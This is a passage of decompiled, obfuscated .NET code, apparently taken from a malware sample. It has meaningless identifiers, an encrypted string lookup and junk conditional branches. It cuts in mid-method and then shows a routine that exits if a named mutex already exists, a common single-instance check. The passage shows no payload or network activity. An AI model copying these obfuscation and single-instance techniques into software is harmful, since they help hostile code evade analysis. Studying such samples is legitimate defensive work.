			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			byte[] result;
			do
			{
				result = null;
				ProjectData.ClearProjectError();
			}
			while (6 == 0);
			return result;
		}
	}

	public static void _00234G()
	{
		try
		{
			while (true)
			{
				Mutex mutex = new Mutex(initiallyOwned: false, _0023h._0023g(3085));
				Mutex mutex2;
				if (3u != 0)
				{
					mutex2 = mutex;
				}
				if (mutex2.WaitOne(0, exitContext: false))
				{
					return;
				}
				Mutex mutex3 = mutex2;
				if (0 == 0)
				{
					mutex3.Close();
				}
				if (7 == 0)
				{
					continue;
				}
				if (0 == 0)
				{
					mutex2 = null;
				}
				if (0 == 0 && 0 == 0)
				{
					if (4u != 0)
					{
						break;
					}
				}
				return;
			}
			Environment.Exit(0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
